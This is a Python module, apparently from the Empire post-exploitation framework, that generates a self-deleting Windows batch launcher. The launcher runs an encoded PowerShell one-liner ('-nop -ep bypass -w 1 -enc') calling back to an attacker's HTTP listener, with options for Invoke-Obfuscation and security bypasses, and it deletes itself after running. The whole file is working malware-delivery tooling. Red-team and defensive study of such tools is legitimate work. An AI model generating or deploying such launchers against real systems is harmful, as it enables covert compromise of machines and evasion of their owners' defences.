from textwrap import dedent

from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import StagerGenerationException


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "BAT Launcher",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                }
            ],
            "Description": "Generates a self-deleting .bat launcher for Empire. Only works with the HTTP and HTTP COM listeners.",
            "Comments": [""],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "csharp", "ironpython", "go"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
                "Required": True,
                "Value": "launcher.bat",
            },
            "Delete": {
                "Description": "Delete .bat after running.",
                "Required": False,
                "Value": True,
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.",
                "Required": False,
                "Value": False,
                "DependsOn": [{"name": "Language", "values": ["powershell"]}],
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use.",
                "Required": False,
                "Value": r"Token\All\1",
                "DependsOn": [
                    {"name": "Language", "values": ["powershell"]},
                    {"name": "Obfuscate", "values": ["True"]},
                ],
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
                "BypassLanguage": "powershell",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        options = self.options
        listener_name = options["Listener"]["Value"]
        obfuscate_command = options["ObfuscateCommand"]["Value"]
        bypasses = options["Bypasses"]["Value"]
        language = options["Language"]["Value"]

        listener = self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name)
        host = listener.options["Host"]["Value"]

        obfuscate = options["Obfuscate"]["Value"]

        delete = options["Delete"]["Value"]

        if not host:
            raise StagerGenerationException("Error in launcher command generation.")

        launcher = ""
        if listener.module == "http":
            if language == "powershell":
                launcher = self.mainMenu.stagergenv2.generate_launcher(
                    listener_name=listener_name,
                    language="powershell",
                    encode=True,
                    obfuscate=obfuscate,
                    obfuscation_command=obfuscate_command,
                    bypasses=bypasses,
                )
            elif language in ["csharp", "ironpython"]:
                oneliner = self.mainMenu.stagergenv2.generate_exe_oneliner(
                    language=language,
                    obfuscate=obfuscate,
                    obfuscation_command=obfuscate_command,
                    encode=True,
                    listener_name=listener_name,
                    bypasses=bypasses,
                )
                launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {oneliner.split('-enc ')[1]}"
            elif language == "go":
                launcher = self.mainMenu.stagergenv2.generate_go_exe_oneliner(
                    language=language,
                    obfuscate=obfuscate,
                    obfuscation_command=obfuscate_command,
                    encode=True,
                    listener_name=listener_name,
                    bypasses=bypasses,
                )

        elif language == "powershell":
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=obfuscate,
                obfuscation_command=obfuscate_command,
                bypasses=bypasses,
            )
        else:
            raise StagerGenerationException(
                f"launcher_bat does not support Language={language} with a "
                f"{listener.module} listener."
            )

        MAX_CHARACTERS = 8192
        if len(launcher) > MAX_CHARACTERS:
            raise StagerGenerationException(
                "Launcher code is greater than 8192 characters."
            )

        code = dedent(
            f"""
            @echo off
            start /B {launcher}
            """
        ).strip()

        if delete:
            code += "\n"
            code += dedent(
                """
                timeout /t 1 > nul
                del "%~f0"
                """
            ).strip()

        return code
